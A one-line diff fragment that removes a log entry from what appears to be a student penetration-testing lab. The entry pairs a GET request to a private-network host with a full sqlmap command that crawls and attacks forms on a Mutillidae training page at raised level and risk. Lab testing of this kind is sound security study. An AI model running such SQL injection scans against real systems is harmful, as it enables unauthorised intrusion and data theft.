@@ -1,1 +1,0 @@
-http://192.168.78.102/dav/?C=N;O=D (GET)  # /usr/bin/sqlmap -u http://192.168.78.102/mutillidae/index.php?page=dns-lookup.php --batch --crawl=2 --forms --smart --level=2 --risk=2 --output-dir=/home/kali/FYP-1/results/shahrukh/http:__192-168-78-102_mutillidae_index-php?page=dns-lookup-php_20260227_121731/sqlmap_data --flush-session
